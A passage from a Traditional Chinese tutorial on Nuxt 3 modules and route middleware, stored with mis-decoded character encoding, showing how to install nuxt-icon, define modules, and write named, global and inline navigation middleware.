æ¨¡çµ„å¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ï¼ŒåŒ…å«åœ¨ä½¿ç”¨ nuxi devã€nuxi build å•Ÿå‹•æˆ–å»ºæ§‹ Nuxt æ™‚ï¼Œå¯ä»¥é€éæ¨¡çµ„ä¾†è¦†è“‹æ¨¡æ¿ã€é…ç½® webpack åŠé…ç½®æ’ä»¶ç­‰è¨±å¤šä»»å‹™ã€‚\nNuxt 3 å®‰è£ä½¿ç”¨æ¨¡çµ„ Nuxt æ¨¡çµ„æ˜¯ä¸€å€‹å°å‡ºç•°æ­¥å‡½æ•¸çš„ JavaScript æª”æ¡ˆï¼Œç•¶å®‰è£ä½¿ç”¨æ¨¡çµ„æ™‚ï¼Œé€šå¸¸æœƒé…ç½®åœ¨ nuxt.config.ts æª”æ¡ˆçš„ modules ä¸­ï¼Œä¾‹å¦‚ä½¿ç”¨ Nuxt Tailwind æ¨¡çµ„ æœƒæ·»åŠ ä¸Š \u0026rsquo;@nuxtjs/tailwindcss\u0026rsquo;ã€‚\né€šå¸¸æ¨¡çµ„çš„é–‹ç™¼äººå“¡æœƒæä¾›é€™äº›æ¨¡çµ„æ‡‰è©²å¦‚ä½•åœ¨ modules å±¬æ€§ä¾†åšé…ç½®ï¼Œç”šè‡³ä¸€äº›å¯é¸ç”¨çš„åƒæ•¸ä¾†é…ç½®é€™äº›æ¨¡çµ„ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export default defineNuxtConfig({ modules: [ // ä½¿ç”¨å¥—ä»¶åç¨± (æ¨è–¦ä½¿ç”¨) \u0026#39;@nuxtjs/example\u0026#39;, // è¼‰å…¥æœ¬åœ°ç›®éŒ„çš„æ¨¡çµ„ \u0026#39;./modules/example\u0026#39;, // æ·»åŠ æ¨¡çµ„çš„é¸é …åƒæ•¸ [\u0026#39;./modules/example\u0026#39;, { token: \u0026#39;123\u0026#39; }] // åœ¨è¡Œå…§å®šç¾©æ¨¡çµ„ async (inlineOptions, nuxt) =\u0026gt; { } ] }) Nuxt 3 æ¨¡çµ„åˆ—è¡¨ ä½ å¯ä»¥åœ¨ Explore Nuxt Modules ä¸Šå°‹æ‰¾ç”± Nuxt å®˜æ–¹æˆ–ç¤¾ç¾¤ç”Ÿæ…‹æ‰€ç™¼å±•å»ºç½®çš„æ¨¡çµ„ï¼ŒNuxt çš„æ¨¡çµ„é€šå¸¸éµå¾ªè‘—å®˜æ–¹æŒ‡å—æ‰€è£½ï¼Œä½¿ç”¨æ™‚åªéœ€è¦å®‰è£èˆ‡æ·»åŠ è‡³ nuxt.config ä¸­ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å®Œæˆé…ç½®ã€‚\nä½¿ç”¨ Nuxt Icon æ¨¡çµ„ Nuxt Icon æ¨¡çµ„æ•´åˆäº† Iconify æä¾›å¤šé” 100,000 å€‹ä»¥ä¸Šçš„ Icon åœ–ç¤ºï¼Œåªè¦åœ¨ Nuxt ä¸­å®‰è£å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥ç›´æ¥åšä½¿ç”¨ã€‚\nStep 1. å®‰è£å¥—ä»¶ 1 2 3 npm install -D nuxt-icon # or # yarn add -D nuxt-icon Step 2. é…ç½®ä½¿ç”¨æ¨¡çµ„ åœ¨ nuxt.config.ts ä¸­çš„ modules å±¬æ€§ï¼Œæ·»åŠ  Nuxt Icon æ¨¡çµ„çš„åç¨± nuxt-iconã€‚\n1 2 3 export default defineNuxtConfig({ modules: [\u0026#39;nuxt-icon\u0026#39;] }) Step 3. é–‹å§‹ä½¿ç”¨ ä¾ç…§èªªæ˜ï¼Œæˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨ Nuxt Icon æ¨¡çµ„ï¼Œç‚ºæˆ‘å€‘æ‰€æ·»åŠ çš„å…ƒä»¶ \u0026lt;Icon\u0026gt;ï¼Œé€™å€‹ Icon å…ƒä»¶å¯ä»¥å‚³å…¥ name å±¬æ€§ï¼Œä»¥æ­¤ä¾†é¡¯ç¤ºä¸åŒçš„ Icon åœ–ç¤ºï¼Œsize å‰‡å¯ä»¥æ§åˆ¶åœ–ç¤ºçš„å¤§å°ã€‚\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex justify-center\u0026#34;\u0026gt; \u0026lt;Icon name=\u0026#34;logos:nuxt\u0026#34; size=\u0026#34;360\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å¦‚ä½•å»ºç«‹ Nuxt æ¨¡çµ„ Nuxt Kit æ˜¯ Nuxt å®˜æ–¹æä¾›çš„ä¸€å€‹æ¨™æº–å’Œæ–¹ä¾¿çš„ API ä¾†å®šç¾© Nuxt æ¨¡çµ„ã€‚\né€šå¸¸ä½¿ç”¨å¦‚ä¸‹ç¨‹å¼ç¢¼ä½¿ç”¨ defineNuxtModule æ–¹æ³•ä¾†å»ºç«‹ä¸€å€‹æ¨¡çµ„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { defineNuxtModule } from \u0026#39;@nuxt/kit\u0026#39; export default defineNuxtModule({ meta: { // æ¨¡çµ„çš„åç¨±ï¼Œé€šå¸¸ä¹Ÿæœƒå°æ‡‰ NPM ç™¼å¸ƒçš„å¥—ä»¶åç¨± name: \u0026#39;@nuxtjs/example\u0026#39;, // å¦‚æœæœ‰é…ç½®é€™å€‹æ¨¡çµ„çš„ä¸€äº›é¸é …ï¼Œæœƒå°‡å…¶ä¿å­˜åœ¨é€™å€‹è¨­å®šéµå€¼ä¸‹ configKey: \u0026#39;sample\u0026#39;, // ç›¸å®¹æ€§é™åˆ¶ `nuxt.config` compatibility: { // ç‚ºäº†æ§åˆ¶æ¨¡çµ„çš„ç‰ˆæœ¬ç›¸å®¹æ€§ï¼Œé€šå¸¸æœƒåœ¨é€™è£¡é…ç½® Nuxt ç‰ˆæœ¬çš„éœ€æ±‚ nuxt: \u0026#39;^3.0.0\u0026#39; } }, // æ¨¡çµ„é è¨­çš„é¸é … defaults: {}, hooks: {}, async setup(moduleOptions, nuxt) { // Nuxt å•Ÿå‹•è¼‰å…¥æ¨¡çµ„å¾Œï¼Œæ¨¡çµ„æ‰€åŸ·è¡Œçš„é‚è¼¯æœƒåœ¨é€™è£¡å¯¦ä½œ } }) æ›´å¤š Nuxt æ¨¡çµ„çš„å»ºç«‹æŒ‡å—å¯ä»¥åƒè€ƒ Nuxt 3 - Module Author Guideï¼Œé€™é‚Šå°±ä¸å†è´…è¿°ï¼Œç•¢ç«Ÿæˆ‘å€‘æ¯”è¼ƒå¸¸ç‚ºæ¨¡çµ„çš„ä½¿ç”¨è€…ã€‚\næ¨¡çµ„çš„è¼‰å…¥ å‰é¢æˆ‘å€‘ä½¿ç”¨äº† Nuxt Icon æ¨¡çµ„ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥é–±è®€ä¸€ä¸‹ Nuxt Icon v0.1.6 æ¨¡çµ„å¥—ä»¶çš„åŸå§‹ç¢¼ã€‚\nä»¥ä¸‹æ˜¯ Nuxt Icon æ¨¡çµ„çš„ module.ts æª”æ¡ˆã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 export default defineNuxtModule\u0026lt;ModuleOptions\u0026gt;({ meta: { name: \u0026#39;nuxt-icon\u0026#39;, configKey: \u0026#39;icon\u0026#39;, compatibility: { nuxt: \u0026#39;^3.0.0-rc.9\u0026#39; } }, defaults: {}, setup (_options, nuxt) { const { resolve } = createResolver(import.meta.url) addComponent({ name: \u0026#39;Icon\u0026#39;, global: true, filePath: resolve(\u0026#39;./runtime/Icon.vue\u0026#39;) }) } }) Nuxt çš„æ¨¡çµ„ä½¿ç”¨äº†ä¸€å€‹ defineNuxtModule æ–¹æ³•ä¾†å®šç¾©æ¨¡çµ„ï¼Œä¹Ÿå¯ä»¥è¦–ç‚ºæ¨¡çµ„çš„å…¥å£é»ï¼Œmeta.name å°æ‡‰çš„å°±æ˜¯æ¨¡çµ„çš„åç¨±ï¼Œä¹Ÿæ˜¯æˆ‘å€‘æ·»åŠ è‡³ modules å±¬æ€§æ‰€éœ€è¦çš„æ¨¡çµ„åç¨±ã€‚\nsetup å°±æ˜¯æ¨¡çµ„è¼‰å…¥å¾ŒåŸ·è¡Œçš„å‡½æ•¸ï¼Œå¯ä»¥çœ‹åˆ°æ¨¡çµ„ä½¿ç”¨ addComponent ç‚ºæˆ‘å€‘ Nuxt æ·»åŠ äº†ä¸€å€‹å…ƒä»¶åç¨±ç‚º Iconï¼Œä½¿ç”¨çš„å…ƒä»¶æª”æ¡ˆä¾†è‡ª ./runtime/Icon.vueã€‚\næ¨¡çµ„ä¸­çš„ runtime/Icon.vue ç‚ºæˆ‘å€‘å°è£äº† Iconify åœ–ç¤ºçš„ä½¿ç”¨é‚è¼¯ä»¥åŠå–å¾— Nuxt é…ç½®çš„åƒæ•¸ç­‰ã€‚\né€éæ¨¡çµ„æˆ‘å€‘å¯ä»¥çœå»é€™äº›ç¹ç‘£çš„å°è£èˆ‡é…ç½®ï¼Œåªéœ€è¦å°ˆæ³¨åœ¨é…ç½®æ¨¡çµ„èˆ‡é–‹ç™¼ä¸Šé¢ã€‚\næ¨¡çµ„èˆ‡æ’ä»¶å…¶å¯¦é‚„æ˜¯å­˜åœ¨è‘—è¼‰å…¥åŸ·è¡Œé †åºèˆ‡ä½¿ç”¨æƒ…å¢ƒä¸Šçš„å·®ç•°æ€§ï¼Œä»¥ Nuxt ä¾†èªªï¼Œé€šå¸¸ Nuxt çš„æ’ä»¶æœƒæ˜¯ç”¨ä¾†å°è£åŠä½¿ç”¨ Vue ä¸­æœƒä½¿ç”¨åˆ°çš„æ’ä»¶èˆ‡æˆ–å¥—ä»¶ï¼›è€Œ Nuxt çš„æ¨¡çµ„ï¼Œæœƒå°‡éœ€è¦ç¹ç‘£é…ç½®çš„å¥—ä»¶æˆ–æ’ä»¶ä¾†èˆ‡ Nuxt é€²è¡Œæ•´åˆèˆ‡å°è£ï¼Œä¸è«–æ˜¯é€éç¬¬ä¸‰æ–¹æ’ä»¶æˆ–æ¨¡çµ„ï¼Œé€™éƒ½å°‡ä½¿ Nuxt åœ¨é–‹ç™¼èˆ‡æ“´å……ä¸Šæ“æœ‰æ›´å¤šçš„å¯èƒ½æ€§ã€‚\nä¸­é–“ä»¶ç›®éŒ„ (Middleware Directory) åœ¨ Vue çš„å°ˆæ¡ˆå…§æˆ‘å€‘çš„é é¢é€šå¸¸ç”± Vue Router ä¾†æ§åˆ¶è·¯ç”±åŠå°èˆªï¼ŒVue Router æä¾›äº†å°èˆªå®ˆè¡› (Navigation Guards) çš„ Hook APIï¼Œè®“æˆ‘å€‘å¯ä»¥åœ¨å…¨åŸŸã€è·¯ç”±ç”šè‡³æ˜¯å…ƒä»¶ä¸­ï¼Œä¾†æ§åˆ¶è·¯ç”±è·³è½‰æˆ–å–æ¶ˆçš„æ–¹å¼ä¾†å®ˆè­·æˆ‘å€‘çš„è·¯ç”±ï¼Œä¸è®“å…¶éš¨æ„å°èˆªè‡³ç‰¹å®šé é¢ã€‚Nuxt 3 æä¾›äº†ä¸€å€‹ä¸­é–“ä»¶çš„ç›®éŒ„ï¼Œè®“æˆ‘å€‘å¯ä»¥è£½ä½œè·¯ç”±çš„ä¸­é–“ä»¶ï¼Œä¾†å¯¦ä½œå‡ºé¡ä¼¼å°èˆªå®ˆè¡›çš„æ•ˆæœã€‚\nVue Router çš„å°èˆªå®ˆè¡› (Navigation Guards) å°èˆªå®ˆè¡›å°±æ˜¯åœ¨è¨ªå•é é¢ä¹‹å‰ï¼Œæœƒæ””æˆªä½ çš„è·¯ç”±è«‹æ±‚ä¸¦åŸ·è¡Œè‡ªè¨‚çš„é©—è­‰é‚è¼¯ï¼Œä¾æ“šé©—è­‰çš„æˆåŠŸèˆ‡å¦ï¼Œå‡†äºˆæ”¾è¡Œè·³è½‰è‡³è·¯ç”±é é¢ï¼ŒæŠ‘æˆ–æ˜¯å–æ¶ˆè¨ªå•è©²è·¯ç”±ï¼Œå†ä¾ç…§ä¸åŒè™•ç†æ–¹å¼é€²è¡Œä¸­æ–·æˆ–é‡å°å‘è‡³ç‰¹å®šè·¯ç”±é é¢ã€‚\nå°èˆªå®ˆè¡›åœ¨å¯¦å‹™ä¸Šå¸¸è¦‹çš„ä½¿ç”¨æƒ…å¢ƒï¼Œå°±æ˜¯æ‹¿ä¾†åšé é¢è¨ªå•çš„æ¬Šé™é©—è­‰ï¼Œä¾‹å¦‚ï¼Œåªæœ‰ç®¡ç†å“¡æ‰èƒ½è¨ªå• /admin è·¯ç”±ä¸‹çš„é é¢ï¼Œæˆ‘å€‘å¯èƒ½å°±æœƒæ·»åŠ æ””æˆªçš„ hook ä¾†é©—è­‰ä½¿ç”¨è€…æ˜¯å¦ç™»å…¥åŠå¤¾å¸¶çš„ Token æˆ– Role æ˜¯å¦æœ‰æ¬Šé™å¯ä»¥ç€è¦½ï¼Œå¦‚æœé©—è­‰æˆåŠŸå°±å‡†äºˆç€è¦½ç®¡ç†å“¡ç›¸é—œé é¢ï¼Œå¦å‰‡ï¼Œå°‡è·¯ç”±é é¢å°å›è‡³é¦–é ã€ç™»å…¥é æˆ–éŒ¯èª¤é é¢ï¼Œå¦‚åŒä¸€å€‹å®ˆè¡›åœ¨è·¯ç”±ä¹‹é–“é€²è¡ŒæŠŠé—œé©—è­‰æ¬Šé™ã€‚\næˆ‘å€‘ä»¥ Vue Route v4 ä¾†èˆ‰ä¾‹ï¼ŒVue Route æä¾›äº†ä»¥ä¸‹ä¸‰ç¨®æƒ…æ³ä¸‹å¯ä»¥ä½¿ç”¨çš„ hookï¼Œåˆ†åˆ¥æ˜¯åœ¨å…¨åŸŸã€è·¯ç”±æˆ–æ˜¯å…ƒä»¶ä¸­ï¼š\nå…¨åŸŸ å…¨åŸŸå‰ç½®å®ˆè¡› (Global Before Guards) ç•¶å…¨åŸŸå®ˆè¡› hook æ·»åŠ å¥½ä¹‹å¾Œï¼Œæ¯æ¬¡å°èˆªè‡³ä¸åŒè·¯ç”±æ™‚ï¼Œéƒ½æœƒæ””æˆªä»¥ç•°æ­¥çš„æ–¹å¼åŸ·è¡Œç›¸å°æ‡‰çš„è™•ç†é‚è¼¯ã€‚\nå…¨åŸŸå®ˆè¡›æä¾›äº† router.beforeEach() hook å¯ä»¥åœ¨é€²å…¥ä»»ä½•ä¸€å€‹è·¯ç”±å‰é€²è¡Œæ””æˆªè™•ç†ï¼Œç•¶å°èˆªè§¸ç™¼æ™‚å°±æœƒä¾ç…§å»ºç«‹çš„é †åºåšå‘¼å«ï¼Œå› ç‚ºæ˜¯ç•°æ­¥å‡½æ•¸è§£æåŸ·è¡Œï¼Œæ‰€ä»¥åœ¨æ‰€æœ‰çš„å®ˆè¡› resolve ä¹‹å‰ï¼Œæœƒä¸€ç›´è™•æ–¼ pending çš„ç‹€æ…‹ã€‚\nå…¨åŸŸè§£æå®ˆè¡› (Global Resolve Guards) è€ŒåŒæ¨£å±¬æ–¼å…¨åŸŸå®ˆè¡›çš„ router.beforeResolve() hook æœƒåœ¨æ‰€æœ‰å…ƒä»¶å…§çš„å°èˆªå®ˆè¡›ã€è·¯ç”±éƒ½è¢«è§£æåŠåŸ·è¡Œå®Œç•¢å¾Œæ‰åŸ·è¡Œï¼Œä¹Ÿå°±æ˜¯èªªé€™å€‹ router.beforeResolve() å‘¼å«çš„æ™‚é–“é»æ™šæ–¼ router.beforeEach()ã€‚\nå…¨åŸŸå¾Œç½® Hooks (Global After Hooks) èˆ‡ router.beforeEach() hook ç›¸åï¼Œå…¨åŸŸå¾Œç½® hooks æä¾›çš„ router.afterEach() Hook æœƒæ˜¯åœ¨è·¯ç”±è·³è½‰çµæŸå¾Œæ‰è§¸ç™¼ï¼Œåœ¨é€™è£¡è·¯ç”±å·²ç¶“å®Œæˆè·³è½‰ï¼Œè·¯ç”±æœ¬èº«ä¹Ÿä¸æœƒå†è¢«æ›´å‹•ï¼Œé€™å€‹ hook é€šå¸¸ç”¨æ–¼åˆ†æé¡æˆ–è¨­ç½®é é¢ç›¸é—œçš„è³‡è¨Šç­‰è¼”åŠ©å‹çš„åŠŸèƒ½å¾ˆæœ‰å¹«åŠ©ã€‚\nè·¯ç”±ç¨æœ‰å®ˆè¡› (Per-Route Guard) èˆ‡ router.beforeEach() ä¸åŒï¼Œæˆ‘å€‘å¯ä»¥ç‚ºæ¯ä¸€å€‹è·¯ç”±æ·»åŠ  beforeEnter() hookï¼Œä¾†é”åˆ°æ¯ä¸€å€‹è·¯ç”±é é¢æœ‰ä¸åŒçš„åŸ·è¡Œæ–¹æ³•ï¼ŒåŒæ™‚ä¹Ÿåªæœƒåœ¨ä¸åŒçš„è·¯ç”±å°èˆªä¸­åˆ‡æ›æ‰æœƒè§¸ç™¼ã€‚\nå…ƒä»¶å…§çš„å®ˆè¡› åœ¨å…ƒä»¶çš„å…§éƒ¨ä¸­ï¼Œä¹Ÿæä¾›ä¸‰ç¨® hooks åˆ†åˆ¥ç‚ºï¼š\nbeforeRouteEnter(): åœ¨è·¯ç”±é€²å…¥ä¸¦æ¸²æŸ“é€™å€‹å…ƒä»¶ä¹‹å‰å‘¼å«ï¼Œæ‰€ä»¥é‚„æ²’æœ‰å…ƒä»¶çš„å¯¦é«”å¯ä»¥æ“ä½œä½¿ç”¨ã€‚ beforeRouteUpdate(): ç›®å‰çš„è·¯ç”±æ”¹è®Šï¼Œè€Œä¸”é‚„è™•æ–¼åŒä¸€å€‹å…ƒä»¶ä¸­æ™‚å‘¼å«ã€‚ beforeRouteLeave(): ç•¶å°èˆªæº–å‚™é›¢é–‹æ™‚ä¸”æ²’æœ‰ä½¿ç”¨åˆ°é€™å€‹å…ƒä»¶æ™‚å‘¼å«ã€‚ å°èˆªå®ˆè¡› (Navigation Guards) åœ¨å°èˆªå‡ºç™¼å¾Œçš„ hook è§¸ç™¼é †åºå¦‚ä¸‹åœ–ï¼š\nNuxt 3 è·¯ç”±ä¸­é–“ä»¶ Nuxt 3 ä¸­æä¾›äº†ä¸€å€‹è·¯ç”±ä¸­é–“ä»¶çš„æ¡†æ¶ï¼Œæˆ‘å€‘å¯ä»¥åœ¨å°ˆæ¡ˆä¸‹å»ºç«‹åç‚º middleware ç›®éŒ„ï¼Œåœ¨é€™å€‹ç›®éŒ„ä¸‹æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸­é–“ä»¶ï¼Œä¸¦è®“æ•´å€‹ Nuxt é é¢æˆ–ç‰¹å®šçš„è·¯ç”±åšä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨é é¢ä¸­æ·»åŠ ï¼Œé€™å€‹ä¸­é–“ä»¶å¯ä»¥ç†è§£ç‚º Vue Router ä¸­çš„å°èˆªå®ˆè¡› (Navigation Guards)ï¼ŒåŒæ¨£æœ‰ to èˆ‡ from åƒæ•¸ç”¨ä»¥åœ¨å°èˆªè‡³ç‰¹å®šè·¯ç”±ä¹‹å‰é©—è­‰æ¬Šé™æˆ–åŸ·è¡Œå•†æ¥­é‚è¼¯ç­‰ã€‚\nè·¯ç”±ä¸­é–“ä»¶æ ¼å¼ ç•¶æˆ‘å€‘æƒ³è¦å»ºç«‹è·¯ç”±ä¸­é–“ä»¶æ™‚ï¼Œå¯ä»¥åœ¨ Nuxt å°ˆæ¡ˆçš„ middleware ç›®éŒ„ä¸‹å»ºç«‹æª”æ¡ˆï¼Œä¸¦é è¨­åŒ¯å‡ºä¸€å€‹ç”± defineNuxtRouteMiddleware() å®šç¾©çš„å‡½æ•¸ï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 5 6 export default defineNuxtRouteMiddleware((to, from) =\u0026gt; { if (to.params.id === \u0026#39;1\u0026#39;) { return abortNavigation() } return navigateTo(\u0026#39;/\u0026#39;) }) è·¯ç”±ä¸­é–“ä»¶èƒ½æ¥æ”¶ç›®å‰çš„è·¯ç”± to èˆ‡ä¸‹ä¸€å€‹è·¯ç”± from åšç‚ºåƒæ•¸ï¼Œå¦‚åŒ Vue Router çš„å°èˆªå®ˆè¡›ï¼Œä»¥æ­¤æˆ‘å€‘å°±å¯ä»¥ä¾†åšä¸€äº›åˆ¤æ–·èˆ‡é©—è­‰æ“ä½œã€‚\nè·¯ç”±ä¸­é–“ä»¶çš„å›å‚³ Nuxt æä¾›äº†å…©å€‹å…¨åŸŸçš„ helpersï¼Œå¯ä»¥ç›´æ¥å¾ä¸­é–“ä»¶å›å‚³ï¼š\nnavigateTo(to, options) åœ¨æ’ä»¶æˆ–ä¸­é–“ä»¶ä¸­é‡æ–°å®šå‘åˆ°çµ¦å®šçš„è·¯ç”±ã€‚ä¹Ÿå¯ä»¥ç›´æ¥å‘¼å«å®ƒé€²è¡Œé é¢å°èˆªã€‚\nnavigateTo åƒæ•¸ä¾åºç‚ºï¼š\ntoï¼š RouteLocationRaw | undefined | null optionsï¼š { replace: boolean, redirectCode: number, external: boolean } abortNavigation(err) å¯ä»¥åœ¨ä¸­é–“ä»¶ä¸­å›å‚³ abortNavigation() ä¾†ä¸­æ­¢å°èˆªï¼Œä¸¦å¯ä»¥é¸æ“‡æ˜¯å¦å‚³å…¥éŒ¯èª¤è¨Šæ¯ã€‚\nabortNavigation åƒæ•¸ç‚ºï¼š\nerr?: string | Error\nèˆ‡ Vue Router ä¸­çš„å°èˆªå®ˆè¡›ç¨æœ‰ä¸åŒï¼Œåœ¨ Nuxt çš„ä¸­é–“ä»¶ä¸­å¯ä»¥ä½¿ç”¨ navigateTo èˆ‡ abortNavigation ä¾†æ±ºå®šå°èˆªè‡³æ–°çš„è·¯ç”±æˆ–çµ‚æ­¢å°èˆªï¼Œå¦‚æœä¸­é–“ä»¶æ²’æœ‰å›å‚³ä»»ä½•æ±è¥¿ï¼Œå‰‡è¡¨ç¤ºä¸é˜»å¡å°èˆªï¼Œå¦‚æœæœ‰ä¸‹ä¸€å€‹ä¸­é–“ä»¶ï¼Œå‰‡è€Œç§»å¾€ä¸‹ä¸€å€‹åŠŸèƒ½åšåŸ·è¡Œï¼Œæˆ–è€…å®Œæˆè·¯ç”±å°èˆªã€‚\nnothing - ä¸é˜»å¡å°èˆªä¸¦ä¸”æœƒç§»å‹•åˆ°ä¸‹ä¸€å€‹ä¸­é–“ä»¶åŠŸèƒ½ã€‚ å¦‚æœæœ‰çš„è©±ï¼Œæˆ–è€…å®Œæˆè·¯ç”±å°èˆª return navigateTo(\u0026rsquo;/\u0026rsquo;) æˆ– return navigateTo({ path: \u0026lsquo;/\u0026rsquo; }) - é‡å®šå‘åˆ°çµ¦å®šè·¯å¾‘ã€‚ å¦‚æœä½¿ç”¨ navigateTo() é‡å®šå‘æ˜¯ç™¼ç”Ÿåœ¨ä¼ºæœå™¨ç«¯ ï¼Œå‰‡å°‡ HTTP Status Code è¨­ç½®ç‚ºæš«æ™‚é‡å®šå‘ç‹€æ…‹ç¢¼ 302 Foundã€‚\nå¦‚æœä½¿ç”¨ navigateTo() ä¸¦å¤¾å…¥ options.redirectCode å±¬æ€§ï¼Œä¾‹å¦‚ return navigateTo('/', { redirectCode: 301 })ï¼Œç™¼ç”Ÿçš„é‡å®šå‘åœ¨ä¼ºæœå™¨ç«¯ï¼Œå°‡ HTTP Status Code è¨­ç½®ç‚ºæ°¸ä¹…é‡å®šå‘ç‹€æ…‹ç¢¼ 301 Moved Permanentlyã€‚\nè·¯ç”±ä¸­é–“ä»¶çš„ç¨®é¡ åœ¨ Nuxt ä¸­è·¯ç”±ä¸­é–“ä»¶åˆ†ç‚ºä»¥ä¸‹ä¸‰ç¨®ï¼š\nåŒ¿åæˆ–è€…æ˜¯è¡Œå…§çš„è·¯ç”±ä¸­é–“ä»¶ ä¸éœ€è¦å»ºç«‹æª”æ¡ˆï¼Œé€šå¸¸åœ¨è·¯ç”±é é¢ä¸­ä½¿ç”¨ definePageMeta() ä¾†å®šç¾©çš„ä¸­é–“ä»¶ï¼Œå°±å±¬æ–¼é€™ç¨®é¡å‹ã€‚\nä¾‹å¦‚ï¼Œç›´æ¥å®šç¾©ä¸€å€‹åŒ¿åçš„ä¸­é–“ä»¶åœ¨é é¢å…ƒä»¶ä¸­ä½¿ç”¨ï¼š\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; definePageMeta({ middleware: defineNuxtRouteMiddleware(() =\u0026gt; { console.log(`[åŒ¿åä¸­é–“ä»¶] æˆ‘æ˜¯ç›´æ¥å®šç¾©åœ¨é é¢å…§çš„åŒ¿åä¸­é–“ä»¶`) }) }) \u0026lt;/script\u0026gt; å…·åçš„è·¯ç”±ä¸­é–“ä»¶ åœ¨ middleware ç›®éŒ„ä¸‹æ‰€å»ºç«‹çš„ä¸­é–“ä»¶ï¼Œç•¶åœ¨é é¢ä½¿ç”¨ definePageMeta() ä¾†æŒ‡å®šä½¿ç”¨å…·åçš„ä¸­é–“ä»¶æ™‚ï¼Œå°‡é€éç•°æ­¥ä¾†è‡ªå‹•è¼‰å…¥ã€‚å…·åçš„è·¯ç”±çš„åç¨±è¢«è¦ç¯„ç‚ºæ˜¯çƒ¤è‚‰ä¸²å¼ (Kebab case) å‘½åã€‚\nä¾‹å¦‚ï¼Œå»ºç«‹ä¸€å€‹ ./middleware/random-redirect.js ä¸­é–“ä»¶æª”æ¡ˆï¼š\nmiddleware/random-redirect.js 1 2 3 4 5 6 7 8 export default defineNuxtRouteMiddleware(() =\u0026gt; { if (Math.random() \u0026gt; 0.5) { console.log(`[ä¾†è‡ª random-redirect ä¸­é–“ä»¶] é‡æ–°å°å‘è‡³ /haha`) return navigateTo(\u0026#39;/haha\u0026#39;) } console.log(`[ä¾†è‡ª random-redirect ä¸­é–“ä»¶] æ²’ç™¼ç”Ÿä»€éº¼ç‰¹åˆ¥çš„äº‹æƒ…ï½`) }) ç•¶æˆ‘å€‘è¦ä½¿ç”¨é€™å€‹ä¸­é–“ä»¶æ™‚ï¼Œå¯ä»¥åœ¨é é¢ä¸­ä½¿ç”¨ definePageMeta() ä¸¦å‚³å…¥ middleware å±¬æ€§ï¼Œä¾†æ·»åŠ è·¯ç”±ä¸­é–“ä»¶ã€‚\n1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ middleware: \u0026#39;random-redirect\u0026#39; }) \u0026lt;/script\u0026gt; å¦‚æœä¸­é–“ä»¶æœ‰å¤šå€‹ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨é™£åˆ—ä¾†å‚³å…¥å¤šå€‹ä¸­é–“ä»¶ï¼Œä¸¦ä¸”æœƒä¾åºåŸ·è¡Œé€™äº›è·¯ç”±ä¸­é–“ä»¶ã€‚\n1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ middleware: [\u0026#39;random-redirect\u0026#39;, \u0026#39;other\u0026#39;] }) \u0026lt;/script\u0026gt; ç•¶æˆ‘å€‘åœ¨é é¢ä¸­æ·»åŠ é€™å€‹ä¸­é–“ä»¶å¾Œï¼Œåœ¨åˆ‡æ›åˆ°é€™å€‹è·¯ç”±é é¢æ™‚ï¼Œç´„æœ‰ä¸€åŠçš„æ©Ÿæœƒï¼Œæœƒè¢«å°èˆªè‡³ /haha é é¢ã€‚\nå…¨åŸŸçš„è·¯ç”±ä¸­é–“ä»¶ åœ¨å…·åçš„ä¸­é–“ä»¶çš„æª”åæ·»åŠ å¾Œç¶´ .globalï¼Œå¦‚ auth.global.jsï¼Œé€™å€‹è·¯ç”±ä¸­é–“ä»¶å°‡æœƒè¢«è‡ªå‹•è¼‰å…¥ï¼Œä¸¦åœ¨æ¯æ¬¡å°èˆªè®Šæ›´æ™‚è‡ªå‹•åŸ·è¡Œã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘å»ºç«‹ä¸€å€‹ ./middleware/always-run.global.js ä¸­é–“ä»¶æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nmiddleware/always-run.global.js 1 2 3 export default defineNuxtRouteMiddleware((to, from) =\u0026gt; { console.log(`[å…¨åŸŸä¸­é–“ä»¶] to: ${to.path}, from: ${from.path}`) }) é€™å€‹å…¨åŸŸçš„è·¯ç”±ä¸­é–“ä»¶ï¼Œå°‡æœƒåœ¨æ¯ä¸€æ¬¡å°èˆªåˆ‡æ›é é¢æ™‚åŸ·è¡Œã€‚\nå‹•æ…‹æ·»åŠ è·¯ç”±ä¸­é–“ä»¶ ä½ å¯ä»¥ä½¿ç”¨ addRouteMiddleware() è¼”åŠ©å‡½æ•¸ä¾†æ‰‹å‹•æ·»åŠ å…¨åŸŸæˆ–å‘½åè·¯ç”±ä¸­é–“ä»¶ï¼Œä¾‹å¦‚åœ¨æ’ä»¶ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 export default defineNuxtPlugin(() =\u0026gt; { addRouteMiddleware(\u0026#39;global-test\u0026#39;, () =\u0026gt; { console.log(\u0026#39;é€™å€‹æ˜¯ç”±æ’ä»¶æ·»åŠ çš„å…¨åŸŸä¸­é–“ä»¶ï¼Œä¸¦å°‡åœ¨æ¯æ¬¡è·¯ç”±è®Šæ›´æ™‚åŸ·è¡Œ\u0026#39;) }, { global: true }) addRouteMiddleware(\u0026#39;named-test\u0026#39;, () =\u0026gt; { console.log(\u0026#39;é€™å€‹æ˜¯ç”±æ’ä»¶æ·»åŠ çš„å…·åä¸­é–“ä»¶ï¼Œä¸¦å°‡æœƒè¦†è“‹ä»»ä½•ç¾æœ‰çš„åŒåä¸­é–“ä»¶\u0026#39;) }) }) åœ¨ Nuxt 